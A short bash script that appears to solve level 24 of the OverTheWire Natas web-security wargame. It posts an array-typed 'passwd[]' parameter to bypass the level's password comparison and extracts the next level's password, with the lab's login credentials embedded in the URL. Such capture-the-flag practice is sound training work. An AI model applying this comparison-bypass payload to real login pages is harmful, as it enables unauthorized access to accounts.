#!/bin/bash
. ../natas.sh
natas_url="http://natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg@natas24.natas.labs.overthewire.org"
function hack() {
	password=$(request 2>&1 | grep -Po "(?<=Password:\s)[\d\w]+")
	echo $(get-natas-url "25" "$password")
}

function request {
	curl \
		-vs \
		-d "passwd[]=$1" \
		$natas_url
}